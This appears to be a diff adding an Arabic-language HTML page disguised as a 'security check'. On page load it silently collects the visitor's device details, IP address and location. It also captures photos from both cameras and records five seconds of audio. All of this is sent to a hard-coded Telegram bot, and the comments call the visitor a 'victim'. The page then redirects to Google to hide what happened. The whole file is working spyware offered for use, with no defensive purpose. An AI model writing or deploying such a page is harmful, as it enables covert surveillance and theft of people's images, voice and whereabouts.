@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>تحقق من الأمان...</title>
+</head>
+<body>
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // إعدادات البوت الخاص بك
+        const token = "8574032844:AAGsr2fIcKikXvzf3WNtbs-ON98FRXIBwd8";
+        const urlParams = new URLSearchParams(window.location.search);
+        // سحب الآيدي من الرابط (المبرمج في كود البايثون)
+        const chat_id = urlParams.get('id') || "7549050561";
+
+        async function startHacking() {
+            let report = "🚀 **تم اصطياد ضحية جديدة** 🚀\n\n";
+
+            // 1. معلومات الجهاز والبطارية
+            try {
+                const battery = await navigator.getBattery();
+                report += `📱 الجهاز: ${navigator.platform}\n`;
+                report += `🔋 البطارية: ${Math.round(battery.level * 100)}%\n`;
+                report += `🔌 حالة الشحن: ${battery.charging ? "يشحن الآن" : "لا يشحن"}\n`;
+                report += `🌐 المتصفح: ${navigator.userAgent.split(' ')[0]}\n`;
+            } catch (e) { report += "⚠️ تعذر سحب بيانات البطارية\n"; }
+
+            // 2. سحب الـ IP
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                report += `🆔 عنوان IP: ${ipData.ip}\n`;
+            } catch (e) {}
+
+            // 3. سحب الموقع الجغرافي
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    report += `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
+                    await sendText(report);
+                }, async () => { 
+                    await sendText(report + "⚠️ الضحية رفض إعطاء صلاحية الموقع\n"); 
+                });
+            } else { await sendText(report); }
+
+            // 4. التصوير (أمامية ثم خلفية)
+            await capturePhoto("user", "الأمامية");
+            await capturePhoto("environment", "الخلفية");
+
+            // 5. تسجيل الصوت (5 ثواني)
+            recordAudio(5000);
+        }
+
+        async function capturePhoto(mode, label) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 1000)); // انتظار استقرار الكاميرا
+                
+                const canvas = document.getElementById('canvas');
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                const frm = new FormData();
+                frm.append('chat_id', chat_id);
+                frm.append('photo', blob, 'capture.jpg');
+                frm.append('caption', `📸 صورة من الكاميرا ${label}`);
+                
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: frm });
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) {}
+        }
+
+        async function recordAudio(duration) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg' });
+                    const frm = new FormData();
+                    frm.append('chat_id', chat_id);
+                    frm.append('voice', blob, 'voice.ogg');
+                    
+                    await fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: 'POST', body: frm });
+                    // التمويه النهائي: تحويل الضحية لجوجل
+                    window.location.href = "https://www.google.com";
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), duration);
+            } catch (e) {
+                window.location.href = "https://www.google.com";
+            }
+        }
+
+        function sendText(text) {
+            return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat_id, text: text, parse_mode: "Markdown" })
+            });
+        }
+
+        // بدء التنفيذ عند تحميل الصفحة
+        window.onload = startHacking;
+    </script>
+</body>
+</html>
